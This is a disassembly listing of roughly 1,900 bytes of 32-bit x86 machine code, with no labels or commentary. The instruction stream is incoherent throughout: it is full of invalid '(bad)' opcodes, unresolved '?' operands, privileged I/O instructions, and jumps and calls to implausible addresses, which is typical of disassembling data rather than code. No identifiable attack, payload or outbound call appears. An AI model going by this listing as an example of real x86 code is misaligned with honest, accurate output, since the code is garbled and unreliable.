  412d92:	scas   al,BYTE PTR es:[edi]
  412d93:	cmp    DWORD PTR [edi-0x7730c1d8],esp
  412d99:	call   0x35167719
  412d9e:	xor    ebx,esi
  412da0:	jl     0x412d2f
  412da2:	or     dh,bh
  412da4:	sub    eax,0x89f2c721
  412da9:	out    dx,al
  412daa:	in     eax,0xda
  412dac:	loop   0x412d56
  412dae:	(bad)  
  412daf:	cli    
  412db0:	xchg   ecx,eax
  412db1:	ins    DWORD PTR es:[edi],dx
  412db2:	lea    ebp,[ecx]
  412db4:	push   ebx
  412db5:	add    al,0x53
  412db7:	(bad)  
  412db8:	jmp    DWORD PTR [edi]
  412dba:	and    BYTE PTR [esp+eax*8],dl
  412dbd:	xchg   edx,eax
  412dbe:	pop    esi
  412dbf:	or     BYTE PTR [ebp+0x9d878bd],cl
  412dc5:	cdq    
  412dc6:	push   ds
  412dc7:	mov    cl,0x5
  412dc9:	fwait
  412dca:	mov    bh,0x41
  412dcc:	aam    0xd6
  412dce:	arpl   WORD PTR [ebp+0x5f],ax
  412dd1:	add    eax,ebx
  412dd3:	jo     0x412d88
  412dd5:	mov    bh,0x53
  412dd7:	xchg   edi,eax
  412dd8:	sti    
  412dd9:	push   ebx
  412dda:	sti    
  412ddb:	cmp    al,0xcb
  412ddd:	xchg   DWORD PTR [esi+0x14],esp
  412de0:	adc    al,0x76
  412de2:	xchg   edi,eax
  412de3:	xchg   BYTE PTR [ebx+eiz*4+0x51],ch
  412de7:	es retf 0xdbc
  412deb:	loopne 0x412d73
  412ded:	inc    ecx
  412dee:	test   al,0x83
  412df0:	loope  0x412dba
  412df2:	repnz inc eax
  412df4:	sub    al,0x2e
  412df6:	pop    es
  412df7:	push   edi
  412df8:	push   ds
  412df9:	sti    
  412dfa:	mov    cl,0x31
  412dfc:	jo     0x412e79
  412dfe:	clc    
  412dff:	mov    DWORD PTR [edi+edx*1],ebx
  412e02:	fcomp  QWORD PTR [eax+0x6d]
  412e05:	pop    es
  412e06:	or     al,0x7a
  412e08:	repz or eax,0x276a0ab9
  412e0e:	inc    edx
  412e0f:	push   0x5e5623c3
  412e14:	sub    DWORD PTR [ebp+0x710c59ed],ecx
  412e1a:	gs pop esi
  412e1c:	pop    ss
  412e1d:	jl     0x412db2
  412e1f:	bound  esi,QWORD PTR [ebp+0x5c532867]
  412e25:	imul   esp,DWORD PTR [eax+0x5d],0x7f
  412e29:	mov    bh,0x33
  412e2b:	xor    eax,0x7bad1572
  412e30:	mov    al,ds:0x9d4f21d8
  412e35:	ins    DWORD PTR es:[edi],dx
  412e36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412e37:	jl     0x412deb
  412e39:	fiadd  WORD PTR [eax]
  412e3b:	repz adc esp,esi
  412e3e:	ss mov al,0x10
  412e41:	sbb    DWORD PTR [edi+0xf2bd80e],esi
  412e47:	cmc    
  412e48:	fisttp QWORD PTR [esi]
  412e4a:	dec    edi
  412e4b:	xchg   edi,eax
  412e4c:	jne    0x412e86
  412e4e:	adc    eax,0x19432795
  412e53:	ds jns 0x412e1b
  412e56:	and    DWORD PTR [ecx],ebp
  412e58:	lea    edx,ss:[edx-0x61c5d949]
  412e5f:	pop    ds
  412e60:	je     0x412ed2
  412e62:	retf   0x7184
  412e65:	enter  0x1851,0xb4
  412e69:	cwde   
  412e6a:	pop    es
  412e6b:	push   0xc1bbd2fa
  412e70:	or     DWORD PTR [ebp+0x38c3c814],edi
  412e76:	push   ebx
  412e77:	sub    DWORD PTR [ecx-0x4d],edx
  412e7a:	mov    ds:0x150da65f,al
  412e7f:	int3   
  412e80:	bsf    ebp,DWORD PTR [esi-0x66]
  412e84:	imul   edx,DWORD PTR [esi],0xfffffffa
  412e87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412e88:	inc    ebx
  412e89:	lock mov eax,ds:0x5e6a611
  412e8f:	cmp    ebx,ebx
  412e91:	xchg   ecx,eax
  412e92:	pop    esi
  412e93:	ins    BYTE PTR es:[edi],dx
  412e94:	(bad)  
  412e95:	cdq    
  412e96:	push   ecx
  412e97:	mov    edi,0xda839fb4
  412e9c:	push   edx
  412e9d:	mov    al,0x81
  412e9f:	(bad)  
  412ea0:	jae    0x412e6d
  412ea2:	sub    ecx,edx
  412ea4:	(bad)  
  412ea5:	jge    0x412e2b
  412ea7:	pop    ebx
  412ea8:	pop    edx
  412ea9:	and    al,cl
  412eab:	or     ecx,ebx
  412ead:	enter  0x5222,0x16
  412eb1:	les    eax,FWORD PTR [esi+0x22]
  412eb4:	out    0x1e,eax
  412eb6:	xor    ah,cl
  412eb8:	fidivr WORD PTR [ecx+edi*4-0x3f11a89b]
  412ebf:	add    ch,BYTE PTR [eax+0x67]
  412ec2:	fcom   DWORD PTR [eax+esi*2+0x60cb7a9c]
  412ec9:	lock icebp 
  412ecb:	push   esp
  412ecc:	(bad)  
  412ecd:	or     cl,BYTE PTR [edi-0x3fcda3cd]
  412ed3:	mov    al,0x8d
  412ed5:	pusha  
  412ed6:	fucomp st(6)
  412ed8:	add    al,0x12
  412eda:	test   ch,ch
  412edc:	inc    ebp
  412edd:	cmp    BYTE PTR ds:0x97f3defe,bl
  412ee3:	imul   eax,DWORD PTR [ebp-0x4ea5a443],0x15
  412eea:	jne    0x412ee2
  412eec:	and    dl,BYTE PTR [esi]
  412eee:	push   edx
  412eef:	(bad)
  412ef4:	icebp  
  412ef5:	pop    esi
  412ef6:	push   es
  412ef7:	mov    ds:0xcf088f8f,al
  412efc:	jae    0x412eb9
  412efe:	adc    BYTE PTR [eax-0x561ef738],bl
  412f04:	(bad)  
  412f05:	lock pusha 
  412f07:	dec    esp
  412f08:	add    bh,BYTE PTR [ebx-0x27d6048f]
  412f0e:	push   esp
  412f0f:	adc    DWORD PTR [ebx],ebx
  412f11:	retf   0xb173
  412f14:	pop    ebp
  412f15:	mov    ds:0xdbfebdac,eax
  412f1a:	fdiv   st(3),st
  412f1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f1d:	fnstsw WORD PTR [edx-0x175c786c]
  412f23:	lock mov cl,0x6b
  412f26:	push   edx
  412f27:	dec    edx
  412f28:	rol    BYTE PTR [esi+0x4cf7d6f6],1
  412f2e:	imul   esp,DWORD PTR [ecx],0xffffffde
  412f31:	out    dx,al
  412f32:	iret   
  412f33:	pop    ss
  412f34:	mov    esi,0x5c223b38
  412f39:	and    eax,0xcfbaf71d
  412f3e:	dec    ebx
  412f3f:	sub    eax,DWORD PTR [edx+0x5c]
  412f42:	xor    al,0xa2
  412f44:	out    0x33,al
  412f46:	repz mov eax,ds:0xbe187978
  412f4c:	je     0x412f3e
  412f4e:	adc    al,0xec
  412f50:	mov    ds:0x9424f769,eax
  412f55:	aas    
  412f56:	int    0x7
  412f58:	fisttp WORD PTR [esi+0x63]
  412f5b:	enter  0x8f8f,0x47
  412f5f:	sbb    ebx,DWORD PTR [ebx]
  412f61:	push   esp
  412f62:	sub    BYTE PTR [esi-0x79],ah
  412f65:	popf   
  412f66:	inc    ecx
  412f67:	shl    DWORD PTR [eax+edi*4-0x26a71ab3],1
  412f6e:	xchg   esp,eax
  412f6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f70:	push   ebp
  412f71:	mov    BYTE PTR [eax-0x36],ch
  412f74:	mov    eax,ds:0xed49864f
  412f79:	and    DWORD PTR [ebx-0x2df4f72b],edx
  412f7f:	stc    
  412f80:	ret    
  412f81:	add    eax,0x611a5874
  412f86:	or     al,0x7f
  412f88:	jp     0x412fdb
  412f8a:	adc    al,0xa8
  412f8c:	xor    edx,DWORD PTR [ebx+ecx*8+0x48]
  412f90:	test   BYTE PTR [esi],bh
  412f92:	pop    esp
  412f93:	cwde   
  412f94:	jecxz  0x412ffe
  412f96:	int3   
  412f97:	int    0x68
  412f99:	xor    al,0x92
  412f9b:	lods   al,BYTE PTR ds:[esi]
  412f9c:	jmp    0x6525dca8
  412fa1:	push   es
  412fa2:	cli    
  412fa3:	mov    ds:0x493cfe98,al
  412fa8:	iret   
  412fa9:	sbb    BYTE PTR [edx-0x42],cl
  412fac:	jbe    0x41300c
  412fae:	in     al,0xd1
  412fb0:	lods   al,BYTE PTR ds:[esi]
  412fb1:	cmp    BYTE PTR [eax+0x16],0xe
  412fb5:	jmp    0x3bac:0xe7421258
  412fbc:	jge    0x412f44
  412fbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412fbf:	and    eax,0x72d8e8d5
  412fc4:	loop   0x413017
  412fc6:	call   0x7dc:0xd363c9f0
  412fcd:	sar    al,0x7d
  412fd0:	push   esi
  412fd1:	test   BYTE PTR [esi],dh
  412fd3:	push   ds
  412fd4:	in     eax,dx
  412fd5:	ds jle 0x413029
  412fd8:	stos   DWORD PTR es:[edi],eax
  412fd9:	push   eax
  412fda:	fcmovbe st,st(5)
  412fdc:	rol    BYTE PTR [edi-0x1c],cl
  412fdf:	or     DWORD PTR [edx],ecx
  412fe1:	gs mov ecx,0xe5d25c25
  412fe7:	(bad)  
  412fe8:	out    dx,eax
  412fe9:	out    0x56,al
  412feb:	shl    DWORD PTR [ecx],1
  412fed:	outs   dx,DWORD PTR ds:[esi]
  412fee:	out    0xb5,eax
  412ff0:	out    dx,eax
  412ff1:	(bad)  
  412ff2:	retf   0x52af
  412ff5:	cmp    DWORD PTR [ebx+ecx*1+0x1bbc3849],eax
  412ffc:	cmp    al,0x52
  412ffe:	jno    0x413024
  413000:	mov    ebx,0x68d49a7f
  413005:	sub    eax,0x1794a9a8
  41300a:	pop    es
  41300b:	jno    0x412fc9
  41300d:	fs not bl
  413010:	and    al,0x61
  413012:	outs   dx,DWORD PTR ds:[esi]
  413013:	sub    eax,0xb782eb16
  413018:	loopne 0x41306f
  41301a:	sub    BYTE PTR [edx],ch
  41301c:	pop    edx
  41301d:	cmp    DWORD PTR [eax],esi
  41301f:	inc    eax
  413020:	mov    esi,0xdcb3d431
  413025:	aaa    
  413026:	fisubr DWORD PTR [esi-0x45]
  413029:	and    BYTE PTR [eax],0x21
  41302c:	sub    al,0x1f
  41302e:	inc    ebp
  41302f:	and    DWORD PTR [edi],0x2
  413032:	mov    edi,0x5a0d6338
  413037:	rcr    BYTE PTR [ebx],cl
  413039:	or     al,0x24
  41303b:	push   ecx
  41303c:	mov    BYTE PTR [bp+0x11],bl
  413040:	into   
  413041:	mov    ebx,0xbbf8ae68
  413046:	xor    DWORD PTR ds:0x31b0dec2,esi
  41304c:	jae    0x413038
  41304e:	sbb    al,0x49
  413050:	fst    QWORD PTR [ebx-0x36787f4a]
  413056:	(bad)  
  413057:	push   ebp
  413058:	je     0x4130bb
  41305a:	add    dl,bh
  41305c:	les    esp,FWORD PTR ds:0x2b9bdabc
  413062:	sub    DWORD PTR [esi-0x5e0dcf48],0xcaf69d67
  41306c:	ja     0x41302b
  41306e:	in     al,dx
  41306f:	sahf   
  413070:	iret   
  413071:	stc    
  413072:	jbe    0x413012
  413074:	mov    dh,0xc8
  413076:	pop    eax
  413077:	sbb    edx,DWORD PTR [ebp+eax*4-0x2f]
  41307b:	pop    eax
  41307c:	pop    eax
  41307d:	jg     0x413021
  41307f:	adc    al,0x74
  413081:	and    BYTE PTR ss:[ecx+0x6a],0x11
  413086:	xor    al,BYTE PTR [edi]
  413088:	ds xchg ebx,eax
  41308a:	das    
  41308b:	push   0x4e
  41308d:	imul   ebx,DWORD PTR [ecx],0xbf5351cf
  413093:	jmp    0x413043
  413095:	popa   
  413096:	imul   eax,DWORD PTR [ecx+0x52c06f2],0xc58c0e73
  4130a0:	in     al,dx
  4130a1:	daa    
  4130a2:	loopne 0x41310c
  4130a4:	push   esp
  4130a5:	js     0x4130f9
  4130a7:	pop    ds
  4130a8:	mov    ecx,edx
  4130aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4130ab:	mov    edi,DWORD PTR [eax+0x16ee81f3]
  4130b1:	sub    BYTE PTR [ebx],ah
  4130b3:	dec    edx
  4130b4:	inc    edx
  4130b5:	in     al,dx
  4130b6:	or     al,0x7f
  4130b8:	pop    bx
  4130ba:	popf   
  4130bb:	ret    
  4130bc:	loope  0x413124
  4130be:	nop
  4130bf:	fwait
  4130c0:	fs pop ds
  4130c2:	fsubr  QWORD PTR [edx]
  4130c4:	mov    ?,WORD PTR [ecx+0x40]
  4130c7:	jae    0x41313c
  4130c9:	cmp    edi,ebp
  4130cb:	outs   dx,DWORD PTR ds:[esi]
  4130cc:	fild   WORD PTR ds:0x708
  4130d1:	lea    edi,[edi-0x6c7647f1]
  4130d7:	pop    ss
  4130d8:	mov    ebx,0xe9d8525
  4130dd:	cmp    BYTE PTR [edi-0x4a],bh
  4130e0:	outs   dx,DWORD PTR ds:[esi]
  4130e1:	mov    bh,BYTE PTR [esp+ecx*4]
  4130e4:	retf   0xe84
  4130e7:	in     al,0x75
  4130e9:	pop    esp
  4130ea:	outs   dx,DWORD PTR ds:[esi]
  4130eb:	dec    esp
  4130ec:	cli    
  4130ed:	out    0x27,al
  4130ef:	inc    esp
  4130f0:	test   DWORD PTR [esi+0x1d6e704f],ebp
  4130f6:	jo     0x413106
  4130f8:	(bad)  
  4130f9:	(bad)  
  4130fa:	in     al,dx
  4130fb:	sbb    ch,BYTE PTR [ecx]
  4130fd:	and    al,0x7b
  4130ff:	cs (bad) 
  413101:	addr16 inc esi
  413103:	loopne 0x41308d
  413105:	(bad)  
  413106:	mov    dl,0xf1
  413108:	mov    DWORD PTR [ecx+0xb],edx
  41310b:	ret    0x26a8
  41310e:	je     0x413176
  413110:	mov    dh,BYTE PTR [ebp-0x6f4ee754]
  413116:	xor    dh,al
  413118:	int    0xc6
  41311a:	mov    eax,ds:0x11be7f3a
  41311f:	xchg   esi,eax
  413120:	inc    ecx
  413121:	jge    0x41314a
  413123:	or     edi,DWORD PTR [ecx-0x30c61b0d]
  413129:	push   DWORD PTR [ecx+eiz*4+0x46]
  41312d:	push   0x40
  41312f:	xchg   DWORD PTR ds:0xa6dd69c5,edi
  413135:	jno    0x41312e
  413137:	mov    dh,0x5a
  413139:	icebp  
  41313a:	sti    
  41313b:	inc    ebx
  41313c:	push   edx
  41313d:	test   DWORD PTR [ebp-0x2b],esi
  413140:	fwait
  413141:	arpl   ax,sp
  413143:	lock dec eax
  413145:	jmp    FWORD PTR [ebx+0x48]
  413148:	int3   
  413149:	mov    ah,BYTE PTR [ecx+0x69a4a02]
  41314f:	pop    ebp
  413150:	push   esi
  413151:	cdq    
  413152:	cs push ds
  413154:	lea    ebp,[ecx-0x36]
  413157:	and    DWORD PTR [ebx],edx
  413159:	cmp    ebp,DWORD PTR [ecx+0x33aed8b3]
  41315f:	push   ebp
  413160:	ds in  al,0xa9
  413163:	xchg   DWORD PTR [ecx-0x74da6f03],esi
  413169:	shr    edx,cl
  41316b:	xor    BYTE PTR [ebx+0x6ce8a053],bh
  413171:	call   0xfda4cf64
  413176:	jmp    0x41313b
  413178:	push   cs
  413179:	shr    bh,0xa8
  41317c:	push   edi
  41317d:	xchg   BYTE PTR [ebx],bl
  41317f:	test   BYTE PTR [edi+0x4d9b5f35],bl
  413185:	addr16 dec edx
  413187:	rcr    DWORD PTR [eax],1
  413189:	mov    ebx,0x9cdbcebe
  41318e:	daa    
  41318f:	mov    bl,0xca
  413191:	jbe    0x413183
  413193:	sti    
  413194:	xor    ecx,DWORD PTR [esi]
  413196:	ja     0x41314f
  413198:	inc    edx
  413199:	sub    BYTE PTR [ecx-0x77],dl
  41319c:	std    
  41319d:	popf   
  41319e:	(bad)  
  41319f:	mov    ds:0xbc73b5df,al
  4131a4:	in     al,dx
  4131a5:	inc    esp
  4131a6:	jg     0x4131a1
  4131a8:	xchg   ebp,eax
  4131a9:	cmp    al,0x90
  4131ab:	(bad)  
  4131ac:	mov    ah,0x48
  4131ae:	adc    ebp,DWORD PTR [ecx-0x5]
  4131b1:	aas    
  4131b2:	dec    edx
  4131b3:	test   ebp,edi
  4131b5:	and    al,BYTE PTR [edx]
  4131b7:	mov    DWORD PTR ds:0x6dda1959,esi
  4131bd:	mov    cl,0x1d
  4131bf:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4131c1:	mov    bh,0x5c
  4131c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4131c4:	ja     0x413153
  4131c6:	inc    esi
  4131c7:	mov    eax,ds:0xf87a1c40
  4131cc:	popa   
  4131cd:	add    BYTE PTR [ebx-0x6f],dl
  4131d0:	dec    ecx
  4131d1:	inc    ebx
  4131d2:	clc    
  4131d3:	daa    
  4131d4:	fucomi st,st(1)
  4131d6:	sbb    DWORD PTR [ebx+eax*2+0x78],0x315631e9
  4131de:	and    al,0x51
  4131e0:	outs   dx,DWORD PTR ds:[esi]
  4131e1:	pop    edx
  4131e2:	mov    edx,0xa621ee8a
  4131e7:	adc    eax,0xbd36b729
  4131ec:	arpl   WORD PTR [ecx-0x51e26d8a],dx
  4131f2:	inc    edx
  4131f3:	add    DWORD PTR [ecx+0x4da7743d],edx
  4131f9:	xor    DWORD PTR [eax],0xffffffe9
  4131fc:	dec    esi
  4131fd:	arpl   WORD PTR [esi+eiz*8],di
  413200:	cmp    al,0x17
  413202:	adc    ch,dl
  413204:	adc    al,BYTE PTR [ebp+ecx*4+0x4e5d0738]
  41320b:	repnz push eax
  41320d:	test   BYTE PTR [edi+0x479ca0f8],0x5c
  413214:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413215:	inc    ebp
  413216:	dec    esp
  413217:	jo     0x4131a1
  413219:	(bad)  
  41321a:	call   0x987d7044
  41321f:	jbe    0x413267
  413221:	es out 0x8f,eax
  413224:	or     dh,BYTE PTR [ecx+0x2c]
  413227:	add    al,BYTE PTR [edi]
  413229:	inc    edi
  41322a:	mov    esp,0xb54ae6a2
  41322f:	mov    WORD PTR [edi-0x7d],fs
  413232:	or     ebx,DWORD PTR [esi+0x3f]
  413235:	add    BYTE PTR [ebp-0x1f5025fc],cl
  41323b:	in     al,dx
  41323c:	das    
  41323d:	fsubr  DWORD PTR [eax-0x4b1c75d2]
  413244:	(bad)  
  413246:	(bad)
  413249:	fstp   TBYTE PTR [esi]
  41324b:	hlt    
  41324c:	in     eax,dx
  41324d:	mov    fs,WORD PTR [ebx+0x2b]
  413250:	jno    0x413271
  413252:	fs xchg edx,eax
  413254:	push   ds
  413255:	xor    BYTE PTR [ebx],ah
  413257:	or     DWORD PTR [eax-0x47],eax
  41325a:	inc    edx
  41325b:	xor    esi,DWORD PTR [ecx]
  41325d:	dec    edx
  41325e:	xor    ah,BYTE PTR [eax-0x20]
  413261:	stos   DWORD PTR es:[edi],eax
  413262:	jbe    0x4131f9
  413264:	daa    
  413265:	inc    ecx
  413266:	cdq    
  413267:	shr    esp,1
  413269:	rcl    DWORD PTR [eax-0x3f3869d5],1
  41326f:	mov    dh,0x76
  413271:	mov    edi,0x567bc194
  413276:	sbb    DWORD PTR [esi+0x7b],0xd5b25c4f
  41327d:	xlat   BYTE PTR ds:[ebx]
  41327e:	test   al,0x22
  413280:	neg    DWORD PTR [ebx+0x1b]
  413283:	add    DWORD PTR [ecx+ebx*4-0x140c1e61],ebx
  41328a:	sub    al,0xf2
  41328c:	sbb    esi,ecx
  41328e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41328f:	xor    esp,eax
  413291:	addr16 std 
  413293:	sub    esi,DWORD PTR [esi]
  413295:	jle    0x413285
  413297:	inc    eax
  413298:	mov    dl,0xa3
  41329a:	push   ds
  41329b:	sar    DWORD PTR [ebx],1
  41329d:	sti    
  41329e:	call   0x7635ade1
  4132a3:	and    BYTE PTR [ecx+ebp*4+0x4b912da5],al
  4132aa:	cmp    al,bl
  4132ac:	and    al,0xc8
  4132ae:	call   0x50950686
  4132b3:	mov    bh,BYTE PTR [edi]
  4132b5:	mov    ch,0xd5
  4132b7:	fdivr  QWORD PTR [edi-0x28]
  4132ba:	lea    esi,[edi]
  4132bc:	out    dx,al
  4132bd:	enter  0xccf9,0xb2
  4132c1:	or     al,0x47
  4132c3:	xor    eax,0x8bb05e3c
  4132c8:	and    eax,0xc6b435bb
  4132cd:	pop    es
  4132ce:	inc    edi
  4132cf:	add    dl,BYTE PTR ds:0x3c3c394d
  4132d5:	pop    ss
  4132d6:	jle    0x41327e
  4132d8:	jo     0x4132fa
  4132da:	retf   
  4132db:	cmp    ecx,DWORD PTR [edx+esi*2-0x5c449c7]
  4132e2:	out    0x9,eax
  4132e4:	sahf   
  4132e5:	test   BYTE PTR [edx+0x14759999],ch
  4132eb:	push   0x1d
  4132ed:	xchg   edx,eax
  4132ee:	push   eax
  4132ef:	and    eax,0x124b2118
  4132f4:	push   esi
  4132f5:	push   0x1
  4132f7:	inc    edx
  4132f8:	out    dx,al
  4132f9:	jno    0x413361
  4132fb:	jmp    0x41335c
  4132fd:	pop    edx
  4132fe:	aam    0x9c
  413300:	jns    0x413287
  413302:	xor    DWORD PTR [ecx],edx
  413304:	xchg   bl,dl
  413306:	test   eax,0x7557b9bb
  41330b:	pop    ebx
  41330c:	push   ss
  41330d:	fist   WORD PTR [edx-0xa]
  413310:	in     al,0x9e
  413312:	mov    ds:0x9672128f,al
  413317:	sub    DWORD PTR [ebx],ecx
  413319:	mov    WORD PTR [eax-0x5],fs
  41331c:	pop    es
  41331d:	add    ebx,DWORD PTR [edx-0x9]
  413320:	sub    ch,BYTE PTR [ebp+0x43]
  413323:	xchg   BYTE PTR [esi+ecx*4],ch
  413326:	repnz mov esi,0x3150f658
  41332c:	retf   
  41332d:	leave  
  41332e:	inc    esi
  41332f:	pop    ss
  413330:	mov    bl,0xd9
  413332:	ret    
  413333:	push   ebp
  413334:	icebp  
  413335:	mov    edx,DWORD PTR ds:0xd96a06a4
  41333b:	push   0xa00a3c38
  413340:	cmp    DWORD PTR [edx-0x78],esi
  413343:	lds    edx,FWORD PTR [edi]
  413345:	jg     0x413384
  413347:	xlat   BYTE PTR ds:[ebx]
  413348:	scas   eax,DWORD PTR es:[edi]
  413349:	jl     0x41337a
  41334b:	test   eax,0x5f446ecf
  413350:	pop    es
  413351:	fwait
  413352:	loop   0x413335
  413354:	ja     0x413383
  413356:	inc    esi
  413357:	cmc    
  413358:	mov    edi,0x24b115
  41335d:	pop    ds
  41335e:	adc    cl,al
  413360:	jnp    0x413339
  413362:	js     0x41335a
  413364:	scas   al,BYTE PTR es:[edi]
  413365:	inc    ebp
  413366:	and    eax,0xfc6a7628
  41336b:	lods   eax,DWORD PTR ds:[esi]
  41336c:	push   ebp
  41336d:	add    ebp,esi
  41336f:	cmp    BYTE PTR [ebx+ebp*4-0x37],bh
  413373:	test   edi,esi
  413375:	cs mov ah,0x95
  413378:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413379:	mov    ds:0x667ffcec,al
  41337e:	cmp    cl,BYTE PTR [ebx]
  413380:	sub    cl,dh
  413382:	and    al,0xc5
  413384:	and    al,0x49
  413386:	es fcom st(2)
  413389:	scas   eax,DWORD PTR es:[edi]
  41338a:	je     0x413326
  41338c:	hlt    
  41338d:	out    dx,eax
  41338e:	jecxz  0x413341
  413390:	jo     0x41338a
  413392:	scas   al,BYTE PTR es:[edi]
  413393:	aam    0xd1
  413395:	xchg   ecx,eax
  413396:	adc    eax,DWORD PTR ds:0x2d514cf4
  41339c:	and    bh,BYTE PTR [ecx-0x7148af11]
  4133a2:	jns    0x413374
  4133a4:	jp     0x4133a8
  4133a6:	out    dx,al
  4133a7:	or     DWORD PTR [ecx],0x62
  4133aa:	ss loopne 0x41334e
  4133ad:	mov    edi,0x9ee2e51f
  4133b2:	imul   edi,DWORD PTR [esi],0x32
  4133b5:	loopne 0x4133f8
  4133b7:	daa    
  4133b8:	mov    bl,0xcd
  4133ba:	mov    esi,0xbeaed134
  4133bf:	add    ebx,DWORD PTR [edi-0x7f3f3cd0]
  4133c5:	push   edx
  4133c6:	call   0x1442:0xb2efccc8
  4133cd:	outs   dx,BYTE PTR ds:[esi]
  4133ce:	push   ebp
  4133cf:	loopne 0x4133b1
  4133d1:	adc    al,0xa6
  4133d3:	cld    
  4133d4:	pop    ebx
  4133d5:	lods   eax,DWORD PTR ds:[esi]
  4133d6:	pop    esp
  4133d7:	imul   eax,ebp,0xffffff99
  4133da:	lea    ecx,[ebp+0x32]
  4133dd:	outs   dx,DWORD PTR ds:[esi]
  4133de:	jp     0x41344d
  4133e0:	dec    esi
  4133e1:	jns    0x41338a
  4133e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4133e4:	cwde   
  4133e5:	dec    eax
  4133e6:	fcomp  st(6)
  4133e8:	mov    dh,0xd6
  4133eb:	je     0x4133fe
  4133ed:	adc    al,cl
  4133ef:	test   al,0x9
  4133f1:	jnp    0x41342d
  4133f3:	je     0x41340b
  4133f5:	push   edx
  4133f6:	cdq    
  4133f7:	hlt    
  4133f8:	aad    0x7d
  4133fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4133fb:	jmp    0xd960:0xd5e99a78
  413402:	cmp    dh,BYTE PTR [eax]
  413404:	icebp  
  413405:	aas    
  413406:	mov    WORD PTR [ecx+esi*2],?
  413409:	bound  edx,QWORD PTR [ebx+0x45]
  41340c:	mov    edi,0xe126fb7a
  413411:	popa   
  413412:	push   0x757a6f0a
  413417:	cmp    ecx,ebp
  413419:	push   ebx
  41341a:	loopne 0x4133cf
  41341c:	(bad)  
  41341d:	ds jae 0x4133bd
  413420:	cmp    esi,DWORD PTR [ebx-0x69d531c1]
  413426:	xchg   edx,eax
  413427:	xchg   edx,eax
  413428:	imul   BYTE PTR [esi+0x2b890073]
  41342e:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413430:	loope  0x413450
  413432:	addr16 cs sbb al,0x35
  413436:	aas    
  413437:	mov    cs,WORD PTR [edx+eax*8]
  41343a:	in     al,0xe4
  41343c:	stos   BYTE PTR es:[edi],al
  41343d:	jo     0x413432
  41343f:	push   esp
  413440:	mov    ecx,0xdd6838a6
  413445:	mov    edx,?
  413447:	add    al,ch
  413449:	xchg   edi,eax
  41344a:	xchg   ebx,eax
  41344b:	jl     0x4133db
  41344d:	popf   
  41344e:	test   DWORD PTR [ebp-0x7f],0xaf264381
  413455:	loopne 0x4134c6
  413457:	mov    edx,0x87083ca4
  41345c:	cli    
  41345d:	jp     0x4134b6
  41345f:	pusha  
  413460:	lds    ebx,FWORD PTR [ebp+0x7e]
  413463:	inc    edx
  413464:	cmp    eax,0x58b819dd
  413469:	out    0x2d,eax
  41346b:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41346d:	gs sbb al,0xc3
  413470:	and    dl,BYTE PTR [ecx+0x6e059ca3]
  413476:	sub    BYTE PTR [ebx],al
  413478:	ins    DWORD PTR es:[edi],dx
  413479:	mov    edi,DWORD PTR [ecx+ebx*4+0x361f4fc0]
  413480:	aad    0xf6
  413482:	sub    BYTE PTR [ebp+0x5a],al
  413485:	and    DWORD PTR [ecx],esp
  413487:	sbb    edx,ecx
  413489:	add    DWORD PTR ss:[eax+0x65722a5e],esp
  413490:	push   ebx
  413491:	jg     0x413426
  413493:	mov    bl,0x39
  413495:	lods   eax,DWORD PTR ds:[esi]
  413496:	push   esp
  413497:	ret    0x20f3
  41349a:	(bad)  
  41349b:	fbld   TBYTE PTR [ecx-0x61ad5b2a]
  4134a1:	or     al,0x16
  4134a3:	retf   
  4134a4:	mov    bl,0xd9
  4134a6:	or     DWORD PTR [edx-0x5f6155ca],eax
  4134ac:	xor    ah,ah
  4134ae:	ror    BYTE PTR ds:0xac36bf3f,1
  4134b4:	pop    esi
  4134b5:	fldlg2 
  4134b7:	mov    edi,0x73c40187
  4134bc:	and    BYTE PTR [eax],ah
  4134be:	jge    0x413521
  4134c0:	mov    ch,0x56
  4134c2:	sahf   
  4134c3:	ficom  DWORD PTR [ebp+eiz*2-0x8]
  4134c7:	sub    edx,DWORD PTR [ebx]
  4134c9:	pop    ds
  4134ca:	mov    ?,ecx
  4134cc:	push   cs
  4134cd:	shr    DWORD PTR [eax+0x65064322],1
  4134d3:	pop    ebp
  4134d4:	clc    
  4134d5:	clc    
  4134d6:	inc    edx
  4134d7:	fidiv  DWORD PTR [edi+ecx*8]
  4134da:	adc    ebp,esi
  4134dc:	(bad)  
  4134dd:	dec    edi
  4134de:	(bad)  
  4134df:	ja     0x4134f8
  4134e1:	or     al,0x98
  4134e3:	fisubr WORD PTR [ecx+0x60047c5e]
  4134e9:	into   
  4134ea:	fistp  DWORD PTR [edx+0x2e]
  4134ed:	mov    ecx,0x27b211ae
  4134f2:	aad    0x3c
  4134f4:	iret   
  4134f5:	adc    DWORD PTR [esi+ebx*1-0x19805168],ecx
  4134fc:	in     al,0x87
  4134fe:	cmp    DWORD PTR [eax+esi*4-0x745fa7a2],ebx
  413505:	ins    DWORD PTR es:[edi],dx
  413506:	icebp  
  413507:	daa    
  413508:	inc    ebp
  413509:	sub    eax,0xda49c296
  41350f:	test   BYTE PTR [eax+edi*1-0x1a369bb6],al
  413516:	into   
  413517:	fwait
  413518:	ja     0x41349e
  41351a:	sub    BYTE PTR [ebx],0x48
  41351d:	je     0x4134d3
  41351f:	(bad)  
  413520:	add    BYTE PTR [ebx+0x24],bl
  413523:	xor    dl,0xc8
  413526:	adc    esp,DWORD PTR [esi]
  413528:	dec    esi
  413529:	jns    0x41357e
  41352b:	adc    al,0x20
  41352d:	add    eax,0x12ea4673
  413532:	enter  0xbcc1,0xff
  413536:	mov    bl,0x3a
  413538:	outs   dx,DWORD PTR ds:[esi]
  413539:	pop    edx
  41353a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
